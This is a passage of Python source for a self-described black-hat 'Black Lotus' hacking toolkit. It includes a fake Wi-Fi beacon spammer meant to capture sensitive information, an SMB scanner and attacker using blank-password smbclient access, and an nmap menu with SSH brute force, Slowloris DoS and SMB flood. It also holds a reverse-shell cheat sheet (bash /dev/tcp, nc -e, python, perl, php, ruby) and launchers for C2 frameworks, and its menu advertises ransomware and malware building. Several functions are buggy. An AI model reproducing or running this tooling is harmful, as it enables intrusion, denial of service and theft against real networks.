             ,&@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@&@
          %&&&&&&&&&&&@@.               *@&&&&&&&&&&&@(
          &@&&&&&&/                           &&&&&&&&&
            @@@                                   &@%
                       #&&&&&&&&&&&&&&&@@/
                   %&&&&&&&&&&&&&&&&&&&&&&&&&*
                   @&&&&&&@@@/     (@&&@&&&&@#
                     *&&                 &&     \033[31mBlack Lotus Fake Wifi Access Point\033[37m
                                                 Capture sensitive information
                           @&&&&&&&&&@
                             &&&&&&&
                               @&&

    """)
    os.system("sudo airmon-ng check kill")
    os.system("sudo airmon-ng")
    print("Choose an interface ^ ")
    iface = input("Enter interface name \033[36m>\033[37m ")
    os.system("sudo airmon-ng start " + str(iface))
    sender_mac = RandMAC()
    ssid = input("Enter the fake wifi name \033[36m>\033[37m ")
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=0.1, iface=iface, loop=1)

#----------------------------------------------------------------------------------------------------------------------
def google_maps():
    try:
        from pygeocoder import Geocoder
    except:
        os.system("sudo pip3 install pygeocoder")
        from pygeocoder import Geocoder
    print("You need an API key, to get one go here http://g.co/dev/maps-no-account")
    business_name = input("Enter name or location \033[31m>\033[37m ")
    print("Searching %s" %business_name)
    results = Geocoder.geocode(business_name)
    for result in results:
        print(result)

#----------------------------------------------------------------------------------------------------------------------
def photo_ai():
    print("\033[37mArtificial Intelligence face scanner")
    print("Search all over the web to find persons face")
    print("Link \033[31m>\033[33m https://pimeyes.com/en \033[37m")

#----------------------------------------------------------------------------------------------------------------------

def reaper():
    import os
    from datetime import datetime
    import time
    smb_scan = True
    os.system('cls||clear')
    print("""\033[31m Black Lotus SMB Exploit Toolkit
                     ⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
    ⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
    ⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
    ⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
    ⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
    ⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
    ⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁
                 \033[37mR3APER SMB (\033[31mscanner\033[37m/\033[31mattacker\033[37m)""")
    def attack():
        step1 = ("sudo nbtscan " + target + "/30")
        os.system(step1)
        ip = input("\n\033[37m(\033[31mSelect target\033[37m)💀\033[5;31m>\033[0;37m ")
        print("\033[37m")
        step2 = ("sudo nmblookup -A " + ip)
        os.system(step2)
        exploit = input("\n\033[37m(\033[31mExploit the selected SMB server\033[37m) \033[31my\033[37m/\033[31mn 💀\033[5;31m>\033[0;37m ")
        if exploit == "y":
            workgroup = input("\n\033[37m(\033[31mEnter WORKGROUP\033[37m) 💀\033[5;31m>\033[0;37m ")
            auth_exp = input("\n\033[37m(\033[31mBlank Password Mode\033[37m) \033[31my\033[37m/\033[31mn 💀\033[5;31m>\033[0;37m ")
            if auth_exp == "y":
                auth_exp = " -N"
            else:
                auth_exp = input("\n\033[37m(\033[31mEnter Password\033[37m) 💀\033[5;31m>\033[0;37m ")
            expl = ("sudo smbclient -L " + ip + " -W " + workgroup + auth_exp)
            print("\033[37mShowing Available Directories..")
            os.system(expl)
            print("Choose a Direcory/Device to connect")
            dir = input("\n\033[37m(\033[31mEnter Dir/Device\033[37m) 💀\033[5;31m>\033[0;37m ")
            expl_dir = ("sudo smbclient \\\\" + ip + "\\" + dir + " -N ")
            print("\033[37mInitialising Access...\033[31m\nThanks for using R3APER!")
            os.system(exp_dir)
        else:
            smb_scan = False
    while smb_scan:
        try:
            target = input("\n\033[37m(\033[31mEnter ip to scan\033[37m)💀\033[5;31m>\033[0;37m ")
            print("\033[31mScanning Target: \033[37m" + target)
            print("\033[31mScanning started at: \033[37m" + str(datetime.now()))
            print("\033[37m")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            port = 137
            result = s.connect_ex((target,port))
            if result ==0:
                attack()
                s.close()
            else:
                print("server does not appear vulnerable")
                a = input("continue with the exploitation process? \033[31my\033[37m/\033[31mn 💀\033[5;31m>\033[0;37m ")
                if a == "y":
                    attack()
                else:
                    smb_scan = False

        except KeyboardInterrupt:
            print("\n Exitting Program!")
            smb_scan = False

#----------------------------------------------------------------------------------------------------------------------

def meg_password_generator():
    import string
    import random
    import os
    os.system('cls||clear')
    print("""\033[31m
              ██████████
          ████░░░░░░░░░░██████
        ██░░░░░░░░░░░░░░░░░░░░██
      ██░░░░░░░░░░░░░░░░░░░░░░░░██    ████
    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░██  ██░░██
    ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░████████████████████████████████
  ██░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
  ██░░░░██      ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
  ██░░░░██      ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
  ██░░░░██      ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░▓▓░░░░░░░░██
  ██░░░░░░██████░░░░░░░░░░░░░░░░░░░░░░░░██████░░██  ██░░░░██  ████████
    ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░██    ██      ████
    ██░░░░░░░░░░░░░░░░░░░░░░░░░░██  ██░░██
      ██░░░░░░░░░░░░░░░░░░░░░░░░██    ████
        ██░░░░░░░░░░░░░░░░░░░░██
          ████░░░░░░░░░░██████          Black Lotus Password Generator
              ▓▓▓▓▓▓▓▓▓▓                    Custom Length

\033[37m""")
    characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")

    def generate_random_password():
        length = int(input("Enter password length \033[31m>\033[37m "))
        random.shuffle(characters)
        password = []
        for i in range(length):
            password.append(random.choice(characters))
        random.shuffle(password)
        print("Password Generated \033[31m> ", "".join(password), "\033[37m ")
    generate_random_password()

#----------------------------------------------------------------------------------------------------------------------
def dns_resolver():
    import dns
    import dns.resolver
    print("""
    _|   DNS RESOLVER
    _[1] Find the ip address for the domain( 'A' RECORD )
    _[2] Find Canonical Name Record ( 'CNAME Value' )
    _[3] Find mail exchanger record ( 'MX RECORD' )

    To exit type 'exit'
    """)
    a = input("DNS resolver \033[5;31m|>\033[0;37m  ")
    if a == "1":
        target_host = input("Target host \033[5;31m|>\033[0;37m ")
        result = dns.resolver.resolve(target_host, 'A')
        for ipval in result:
            print('\nIP\033[31m ', ipval.to_text(), '\033[37m')
    elif a == "2":
        target_host = input("Target to CNAME \033[5;31m|>\033[0;37m ")
        result = dns.resolver.resolve(target_host, 'CNAME')
        for cnameval in result:
            print('\nCNAME target address: \033[31m', cnameval.target, '\033[37m')
    elif a =="3":
        target_host = input("Target to MX RECORD \033[5;31m|>\033[0;37m ")
        result = dns.resolver.resolve(target_host, 'MX')
        for exdata in result:
            print('\nMX Record: \033[31m', exdata.exchange.text(), '\033[37m')
    elif a =="exit":
        dns_resolver = False
    else:
        print(a, " not recognized, try again '1,2 or 3'")

#----------------------------------------------------------------------------------------------------------------------
def telnet_connect():
    import getpass
    import telnetlib

    HOST = "http://localhost:8000/"
    user = input("Enter your remote account \033[5;31m|>\033[0;37m ")
    password = getpass.getpass()

    tn = telnetlib.Telnet(HOST)

    tn.read_until("login: ")
    tn.write(user + "\n")
    if password:
        tn.read_until("Password: ")
        tn.write(password + "\n")

    tn.write("ls\n")
    tn.write("exit\n")

    print(tn.read_all())

#----------------------------------------------------------------------------------------------------------------------

def trevor_darknet():
    import os
    os.system('cd Documents/boot-menu/meg/tools/trevorc2 && sudo pip3 install -r requirements.txt && sudo pip3 install bleach && sudo python3 trevorc2_server.py')

#----------------------------------------------------------------------------------------------------------------------

def koadic_darknet():
    os.system("cls||clear")
    print("Black Lotus Darknet Collection")
    os.system("cd Documents/boot-menu/meg/tools/koadic && sudo pip3 install -r requirements.txt && sudo ./koadic")

#----------------------------------------------------------------------------------------------------------------------

def blindmaiden_automated_scanner():
    import os
    import time
    os.system('cls||clear')
    def ip_addr_scanner_target():
        import re
        import json
        from urllib.request import urlopen
        ip_addr = input("\033[37mEnter Target Ip Address \033[36m> \033[37m")
        url = 'http://ipinfo.io/' + str(ip_addr) + '/json'
        response = urlopen(url)
        data = json.load(response)

        ip=data['ip']
        org=data['org']
        city = data['city']
        country=data['country']
        region=data['region']
        location=data['loc']
        hostname=data['hostname']

        print('\033[34mIP Address Details\n \033[37m')
        print('\033[37mIP: \033[34m', ip, '\033[37m\nRegion: \033[34m', region, '\033[37m\nCountry: \033[34m',country, '\033[37m\nCity: \033[34m',city, '\033[37m\nOrg: \033[34m', org, '\033[37m ')
        print('\033[37mLocation: \033[34m', location)
        print('\033[37mHostname: \033[34m', hostname)

    def blindmaiden_scan():
        os.system('cls||clear')
        blindmaiden_scan_build = True
        scan1 = " "
        scan2 = " "
        scan3 = " "
        scan4 = " "
        scan5 = "0"
        scan6 = " "
        scan7 = " "
        scan8 = " "
        scan9 = " "
        scan10 = " "
        scan11 = " "
        scan12 = " "
        scan13 = " "
        scan14 = " "
        scan15 = " "
        scan16 = " "
        scan17 = " "
        scan18 = " "
        scan19 = " "
        scan20 = " "
        while blindmaiden_scan_build:
            print("\033[36m")
            print(r"""Automated Nmap Scanner
                            ,--.           By
                           {    }           Th3 Jes7er
                           K,   }
                          /  ~Y`   Blindmaiden Scan Build Package
                     ,   /   /
                    {_'-K.__/      [1]  Firewall Bypass
                      `/-.__L._    [2]  OS Detection
                      /  ' /`\_}   [3]  Port Service Version
                     /  ' /        [4]  Traceroute
             ____   /  ' /         [5]  Ip Information
      ,-'~~~~    ~~/  ' /_         [6]  Banner Grabbing
    ,'             ``~~~  ',       [7]  Bruteforce DNS
   (                        Y      [8]  Bruteforce SSH
  {                         I      [9]  HTTP Enumeration
 {      -                    `,    [10] Basic Nmap Scripts
 |       ',                   )    [11] Vulnerability Scanning
 |        |   ,..__      __. Y     [12] HTTP PHP VERSION
 |    .,_./  Y ' / ^Y   J   )|     [13] ALL PORTS SCAN
 \           |' /   |   |   ||     [14] CUSTOM PORT SCAN
  \          L_/    . _ (_,.'(     [15] FAST SCAN
   \,   ,      ^^""' / |      )    [16] SET CUSTOM SPEED
     \_  \          /,L]     /     [17] SLOWLORIS DOS ATTACK
       '-_~-,       ` `   ./`      [18] SMB FLOOD
          `'{_            )        [19] DECOY SCAN
              ^^\..___,.--`        [20] Skip Host Discovery
                                   [00] START SCANNING
                                   [99] Exit Blindmaiden
    To exit type 'exit' or '99'
        """)
            a = input("\033[37mBlindmaiden \033[36mx\033[37m ")
            os.system('cls||clear')
            if a =="1":
                scan1 = str("-PO --script firewalk -f")
                print("+Firewall Bypass Selected")
            elif a =="2":
                scan2 = str("-O -A")
                print("+OS Detection Selected")
            elif a =="3":
                scan3 = str("-sV")
                print("+Port Service Version Selected")
            elif a =="4":
                scan4 = str("--traceroute")
                print("+Traceroute Selected")
            elif a =="5":
                scan5 = "1"
                print("+Ip Details Selected")
            elif a =="6":
                scan6 = str("--script=banner --version-intensity 5")
                print("+Banner Grabbing Selected")
            elif a =="7":
                scan7 = str("--script dns-brute")
                print("+DNS Bruteforce Selected")
            elif a =="8":
                scan8 = str("--script ssh-brute")
                print("+SSH Bruteforce Selected")
            elif a =="9":
                scan9 = str("--script http-enum")
                print("+HTTP Enumeration Selected")
            elif a =="10":
                scan10 = str("-sC")
                print("+Basic Scripts Selected")
            elif a =="11":
                scan11 = str("--script vuln")
                print("+Vulnerability Scan Selected")
            elif a =="12":
                scan12 = str("--script=http-php-version")
                print("+PHP Version Selected")
            elif a =="13":
                scan13 = str("-p-")
                print("+All Ports Scan Selected")
            elif a =="14":
                b = input("Blindmaiden(\033[36mport\033[37m)\033[36mx\033[37m ")
                b = str(b)
                scan14 = str("-p " + b)
                print("+Custom Port Scan Selected")
                print("Port: ", b)
            elif a =="15":
                scan15 = str("-F")
                print("+Fast Scan Selected")
            elif a =="16":
                b = input("Blindmaiden(speed '1-5' )x ")
                scan16 = str("-T", b)
                print("+Speed Selected ", b)
            elif a =="17":
                scan17 = str("--script http-slowloris")
                print("+Slowloris DOS Attack Selected")
            elif a =="18":
                scan18 = str("--script smb-flood.nse")
                print("+SMB Flood Selected")
            elif a =="19":
                scan19 = str("-D RND:5")
                print("+Decoy Scan Selected")
            elif a =="20":
                scan20 = str("-Pn")
                print("+Skip Host Discovery Selected")
            elif a =="00":
                print("Enter target ip or hostname")
                print("do not include http/https on url")
                target = input("Blindmaiden(\033[36mtarget\033[37m) \033[36mx\033[37m ")
                final_scan = (scan1 + " " + scan2 + " " + scan3 + " " + scan4 + " " + scan6 + " " + scan7 + " " + scan8 + " " + scan9 + " " + scan10 + " " + scan11 + " " + scan12 + " " + scan13 + " " + scan14 + " " + scan15 + " " + scan16 + " " + scan17 + " " + scan18 + " " + scan19 + " " + scan20 + " " + str(target))
                start = str(final_scan)
                if scan5 == "1":
                    ip_addr_scanner_target()
                else:
                    pass
                print("\033[37mPinging Target:\033[36m ", target)
                print("\033[36mInitialising target scan...")
                time.sleep(1)
                print("Starting Target Scanning")
                print("THANKS FOR CHOOSING BLINDMAIDEN")
                os.system("sudo nmap " + start)
                print("\033[37m")
            elif a =="99":
                os.system("cls||clear")
                print("\033[36mShutting Down Blindmaiden...\033[37m")
                blindmaiden_scan_build = False
            elif a =="exit":
                os.system("cls||clear")
                print("\033[36mShutting Down Blindmaiden...\033[37m")
                blindmaiden_scan_build = False
            else:
                print(a, " not recognized, try again")
    blindmaiden_scan()

#----------------------------------------------------------------------------------------------------------------------

def shell_lists():
    print("""\033[37m
\033[33mReverse Shell List:
\033[31m>>>>>>>>>>>>>>>>>>>
\033[31m#\033[37m bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
\033[31m#\033[37m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234)
\033[31m#\033[37m php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
\033[31m#\033[37m nc -e /bin/sh 10.0.0.1 1234
\033[31m#\033[37m ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
\033[31m#\033[37m perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    
    
\033[33mSpawn Pty Terminal:
\033[31m>>>>>>>>>>>>>>>>>>>
\033[31m#\033[37m python -c "import pty; pty.spawn('/bin/bash');" 

\033[33mLaunch A Shell Through Nmap As Root:
\033[31m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\033[31m#\033[37m nmap --interactive
\033[31m#\033[37m !sh
 """)

#----------------------------------------------------------------------------------------------------------------------

def secure_con():
	import socket, ssl

	context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
	context.verify_mode = ssl.CERT_REQUIRED
	context.check_hostname = True
	context.load_default_certs()

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = input("\033[37mEnter server to connect \033[5;31m>\033[0;37m ")
	try:
		ssl_sock = context.wrap_socket(s, server_hostname=host, ciphers=TLS_RSA_WITH_AES_256_CBC_SHA|TLS_RSA_WITH_AES_128_CBC_SHA)
		ssl_sock.connect((host, 443))
		print("\033[32mConnection established!!")
	except:
		print("\033[31mServer unreachable or does not support the specific encryption")

#----------------------------------------------------------------------------------------------------------------------

def about_us():
    print("""
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
Black Lotus is a Greek Black Hat group that is capable of protecting Greece
when it comes to cyberwar. Our Target scope does not stop there, we find and attack
illegal activity such as Child Pornography, Drugs, Human Trafficking and more.
We might be pirates but we respect human rights.
With black lotus these have come to an end:
  + 600 Child Pornography Websites
  + Human Trafficking
  + More than 100 pedophiles

If you are a criminal, you are already our target.
This Toolkit was designed first for the team of Black Lotus
Use it with caution
= = = = = = = = = = = =  = = = = = = = = = = = = = = = = = = = = = = = = =
    """)

#----------------------------------------------------------------------------------------------------------------------

def crack_emailxl():
    os.system("cd /Black-Lotus")
    os.system("sudo chmod +x craxl.sh")
    os.system("sudo ./craxl.sh")

#----------------------------------------------------------------------------------------------------------------------

def meterpreter():
    print("\033[0;37m ")
    os.system('cls||clear')
    print("""
                          od+-
                         -dMm//o:
                       `h+:yds`:`      .-o+:-.
                        -o/hNN/`  +/-:`..`:s/:/+.
                  `-///::ddydMm+.::/o/:. `  .-/-s.
                `ohhhyso+//-/mNo-./+s/s/- `   ` +.
               -ydoy+::/:-/-+oNh/:.o/:+:. yy.` `.
             -/.dsy. `+s//++/:+h-.+o/://``dN// :-
             -`-ymh/ `/+s-+os:.yy+-..--..:hm+/-s.
             :`-:+yys.`:o+.-/-:ydyo/+-.`o:od//y/ `
             -//:.--hd+``-` `///yh/.-`s--:oyoos/ohoss-
               .d/`.:sd:/o`.:`..oy++syyhmNNdmdd+oy:sNd.
                -///:o+yo.-++oshhddNNNNMNNmydmhh/::oNN-
                  `:o+/+syyymNNMMNmmmdddhsyyys+oy--+yy-
                    ./sydhmNmNNNNNmNmmmddhyyyss/h/ `.`
                     .oyhhhdhddNNNmmNNNmmmmds+:+do
                     ....yyddmhdmmmdmNNmmmmmh::oy+
                     `.` -yssyy++hmyhdmhsshhho/oh/
                         :/.  `` `osomo:---`.+:yy`
                         +-.   \033[5;31m*\033[0;37m  `+oh/y.    :sh+
           `+.         ``oy//. ...`oss+ho   `yNss`    .`-o+`
      ```..ym/+/:.`   `.-/syyys+//.`.yhhdhdhhNNdh`  `/dy+so+-`.:`
     `ho/dy+/ooohhys+-`  -...:::+...`yNdyhNmmmms::oydyy/ ../++-ss-
     .yy:-`     `./ydmdo-://::..`.-..-ddmhddshdhdhy+-        ` :dy
      ./+.           .-:-.` ..:+.:ssssddNd:ymdyo-              ./+
                            `:-+/soymhdddy/..
                             ---/o+yysdsoo.``
                       `.:++/   ````..`.:yhhhy+-`
                  `.:+shyyo:.             .:ohhmdhs/.`
       --`--.:/+osyyyo:-`                     `./sdmdhhs/:.``
       -+++hhhy+/.`                                 ./ohmmmdhoys`
       .++s+``                \033[5;31mThe Jes7er\033[0;37m                `-+s:+m/
         .-..                                                :-
                 \033[37mx[ \033[31mBlack Lotus v2-dev-  \033[37m        ]\033[31m
          \033[37m  x  --x[ \033[31mBlackhat Hacker\033[37m toolkit      ]\033[31m
          \033[37mx x  --x[ \033[31m72\033[37m custom scripts            ]\033[31m

          \033[37m For help, type 'help' in the meterpreter\033[37m""")
    metcon = True
    while metcon:
        a = input("\033[31mC:\Black Lotus \033[5;31m|>\033[0;37m ")
        if a =="help":
           os.system('cls||clear')
           print("""\033[37m
 \033[31mBlack Lotus Cyber Lab\033[37m
 =============
 \033[31mCORE COMMANDS \033[37m
 =============
 #   Command    Description
 #   -------    ---------
 #   clear       Clear terminal
 #   exit/quit   exit the console
 #   cd          navigate through directories
 #   pwd         print working directory
 #   ls          list computer files
 #   mkdir       make a new directory
 #   touch       make a new file
 #   about-us    Get to know Black Lotus Better

 ==================================
 \033[31mUpcoming tools (not supported now) \033[37m
 ==================================
 #   Command    Description
 #   -------    -----------
 #   ddos    denial of service attacks
 #   drone   Hack drones ...

 ===========
 \033[31mNETWORK LAB\033[37m
 ===========
 #   Command   Description
 #   -------   -----------
 #   wifi         Automated Wifi cracking
 #   db-nmap      use nmap to get sensitive information about target network
 #   db-netcat    a computer networking utility for reading from and
                    |_writing to network connections via TCP/UDP
 #   observer     Advanced Network SCanner
 #   blindmaiden  Automated custom scan builder
 #   wireshark    analyze and capture packets
 #   etherape     Monitor network traffic
 #   listener     make a custom listener for incoming connections
 #   atom         Wifi Network Killer
 #   wipp         Wireless Network Mapping ( Geolocate Routers )
 #   postman      send and recieve files via tcp
 #   rtsp         View rtsp ip cameras with megalodon's rtsp viewer
 #   sniper       Reveal ip details(GEO location, provider, country etc)
 #   fpoint       Create a Fake Wifi access point to capture sensitive info
 #   telnet       Connect to a computer in your network
 #   dns-resolver Find dns record from various websites or hostnames
 #   reaper       Automatic smb scanner/attacker

 ===========
 \033[31mMALWARE LAB\033[37m
 ===========
 #   Command   Description
 #   -------   -----------
 #   viking    Black Lotus advanced malware development toolkit
 #   ransom    Create a ransomware to deploy on the enemy machine
                |_Cause your enemies must pay!!
 #   voodoo    Manipulate the target computer using a revershell
 #   shells    A list of shells to use on the enemy computer

 =================
 \033[31mPASSWORD CRACKING \033[37m
 =================
 #   Command   Description
 #   -------   -----------
 #   hash-lab    encrypt/decrypt text or passwords
 #   zip-crack   crack zip files
 #   pdf-crack   crack pdf files
 #   password    Custom length password generator
 #   craxl       Email Cracking Automation Tool Using Hydra 

 =================
 \033[31mINVESTIGATION LAB\033[37m
 =================
 #   Command   Description
 #   -------   -----------
 #   people    find information about a person
 #   phone     find information about a phone number
 #   email-va  find if an email is Valid
 #   photo     find information about a photo
 #   shodan    search for public vulnerable servers, IoT devices
                    |_ power plants, security cams
 #   meta-scraper  Scrape hidden files in target domain
 #   steg          Use steganography to hide data in pictures
 #   face          Search all over the web to find persons face
 #   google-maps  translate addresses directly to geographic coordinates

 ==================
 \033[31mDATABASE ASSEGMENT\033[37m
 ==================
 #   Command   Description
 #   -------   -----------
 #   sql-injection    Black Lotus SQL Injection Scanner
 #   database (upcoming)        Create a MySQL Database
 #   db-sqlmap        Use sqlmap for advanced SQL Injection

 ===========
 \033[31mWEB HACKING\033[37m
 ===========
 #   Command   Description
 #   -------   -----------
 #   emails     Extract email addresses
 #   xss        XSS vulnerability detection in web pages
 #   subdomain  Scans web page for subdomains
 #   links      Extract all internal/external website links

 =================
 \033[31mVULN RESEARCH LAB\033[37m
 =================
 #   Command   Description
 #   -------   -----------
 #   exploitdb  Find details about an exploit using exploitdb
 #   cve        Get information about a CVE Vulnerability

 ===============
 \033[31mANONYMITY TOOLS \033[37m
 ===============
 #   Command    Description
 #   -------    -----------
 #   tor-start  Hide your IP via Tor Relays (3 Tor Relays)
 #   tor-stop   Stop hiding via Tor Relays
 #   mac        Change your MAC Address (Once you restart your
                      |_computer mac goes back to normal.)
 #   vpn        Connect from custom VPN file
 #   ghost      Become invisible using Black Lotus way of protection
                  |_(You might have slower internet connection)
 #   secure     connect to servers using advanced encryption

 ============
 \033[31mSECURITY LAB\033[37m
 ============
 #   Command    Description
 #   -------    -----------
 #   arp-detector    Detect ARP Spoof Attack via perform passive monitoring
 #   firewall        Black Lotus Firewall Panel to utilise linux

 ====================
 \033[31mSYSTEM UTILITY TOOLS \033[37m
 ====================
 #   Command    Description
 #   -------    -----------
 #   host           Basics about host machine ( Ip address, hostname, MAC, etc)
 #   diagnostics    Black Lotus Advanced Computer/Network Diagnostics Panel
 #   text-editor    Black Lotus offers integrated text editor for our hackers!
 #   webcam         Custom webcam opener (not capturing image/video)
 #   browser        Black Lotus custom lightweight web-browser app
 #   update-system  Check for upgrades for your linux machine
 #   evolution      Evolve Black Lotus to it's last version

 =============
 \033[31mDARKNET TOOLS (Not supported yet)\033[37m
 =============
 #   Command    Description
 #   -------    -----------
 #   exitmap   Analyse tor exit nodes
 #   trevor    TrevorC2 is a client/server model for masking command and control
                 |_through a normally browsable website
 #   koadic    Windows post-exploitation rootkit

\033[37m----------------------------------------------------------------------------------------------------------------------------------
\033[5;31m|> Help menu \033[0;37m
\033[37m----------------------------------------------------------------------------------------------------------------------------------
""")
        elif a =="host":
            host_details()
        elif a =="craxl":
            crack_emailxl()
        elif a =="about-us":
            about_us()
        elif a =="reaper":
            reaper()
        elif a =="cve":
            cve_search()
        elif a =="secure":
            secure_con()
        elif a =="dns-resolver":
            dns_resolver()
        elif a =="telnet":
            telnet_connect()
        elif a =="observer":
            observer()
        elif a =="arp-detector":
            detect_arp()
        elif a =="blindmaiden":
            blindmaiden_automated_scanner()
        #elif a =="koadic":
        #    koadic_darknet()
        elif a =="face":
            photo_ai()
        elif a =="google-maps":
            google_maps()
       # elif a =="trevor":
        #    trevor_darknet()
        elif a =="shells":
            shell_lists()
        elif a =="password":
            meg_password_generator()
        elif a =="steg":
            steganography_meg()
        elif a =="fpoint":
            fake_wifi_access_point()
        elif a =="sql-injection":
            meg_sql_scan()
        elif a =="update-system":
            updatesystem()
        elif a =="sniper":
            sniper()
        elif a=="wipp":
            wipp()
        elif a =="exploitdb":
            exploitdb()
        elif a=="webcam":
            webcam_opener()
        elif a=="browser":
            carnival_webbrowser()
        elif a=="diagnostics":
            computer_diagnostics()
        elif a=="meta-scraper":
            meta_scraper()
        elif a=="firewall":
            firewall_utilis()
        elif a=="postman":
            postman()
        elif a=="text-editor":
            text_editor()
        elif a=="rtsp":
            rtsp_camera()
        elif a=="email-va":
            email_va()
        elif a =="shodan":
            shodan()
        elif a =="exit":
            os.system('cls||clear')
            sys.exit()
        elif a =="quit":
            os.system('cls||clear')
            sys.exit()
        elif a =="clear":
            os.system('cls||clear')
        elif a =="cd":
            os.chdir(input("Enter path: "))
        elif a =="pwd":
            path = str(os.getcwdb())
            path2 = path.strip("b'")
            print(path2)
        elif a =="ls":
            print(os.listdir(os.getcwd()))
        elif a =="mkdir":
            b = input("Enter the path needed for the new directory: ")
            c = input("Enter new directory name: ")
            path = os.path.join(b, c)
            os.mkdir(path)
            print("New directory ", c)
        elif a =="touch":
            file_name = input("File name \033[31m>\033[37m ")
            os.system(open(), file_name)
        elif a=="emails":
            emails()
        elif a=="viking":
            viking_malware()
        elif a=="voodoo":
            reverse_server()
        elif a=="ransom":
            ransomware_instructions()
        elif a=="xss":
            xss()
        elif a=="links":
            links()
        elif a =="hash-lab":
            hash_crack()
        elif a =="pdf-crack":
            pdf_crack()
        elif a =="zip-crack":
            zip_crack()
        elif a =="tor-start":
            os.system("sudo anonsurf start")
            time.sleep(1)
            os.system('cls||clear')
            print("\033[37mAnon Tor service \033[31mActivated\033[37m")
        elif a =="tor-stop":
            os.system("sudo anonsurf stop")
            time.sleep(1)
            os.system('cls||clear')
            print("\033[37mAnon Tor service \033[31mDisabled\033[37m")
        elif a =="mac":
            interface = input("Enter interface > ")
            os.system("sudo macchanger -r " + interface)
            print("     ")
        elif a =="vpn":
            v = input("VPN file \033[31m>\033[37m ")
            os.system("sudo openvpn " + v)
        elif a =="ghost":
            ghost_anon()
        elif a == "phone":
            phone_lookup()
        elif a =="photo":
            photo()
        elif a =="listener":
            listener()
        elif a =="atom":
            atom()
        elif a == "db-sqlmap":
            print("\033[37mConnecting to Sqlmap database...")
            time.sleep(1)
            print("\033[32mConnection Established!!!\033[37m")
            time.sleep(0.2)
            print("""\033[31m
        ___
       __H__
 ___ ___[\033[33m"\033[31m]_____ ___ ___  [\033[37m1.5.9#stable\033[31m]
|_ -| . [\033[33m)\033[31m]     | .'| . |
|___|_  [\033[33m'\033[31m]_|_|_|__,|  _|
      |_|\033[33mV\033[31m...       |_|   \033[37mhttp://sqlmap.org

Usage: \033[31msqlmap\033[37m [\033[33moptions\033[37m]
\033[37mUse \033[31m-h\033[37m for basic and \033[31m-hh\033[37m for advanced help
to exit type '\033[31mexit\033[37m'
            \033[37m""")
            sqlmap = True
            while sqlmap:
                n = input("\033[37m Sqlmap \033[31m>\033[37m ")
                if n =="exit":
                    print("\033[31mExitting Sqlmap\033[37m")
                    sqlmap = False
